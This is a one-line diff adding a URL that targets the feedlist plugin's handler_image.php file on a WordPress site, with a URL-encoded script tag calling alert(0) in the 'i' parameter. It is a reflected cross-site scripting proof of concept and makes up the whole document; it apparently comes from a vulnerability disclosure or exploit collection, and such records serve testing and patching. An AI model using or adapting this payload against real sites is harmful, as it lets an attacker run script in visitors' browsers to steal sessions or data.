@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/feedlist/handler_image.php?i=%3Cscript%3Ealert(0)%3C/script%3E
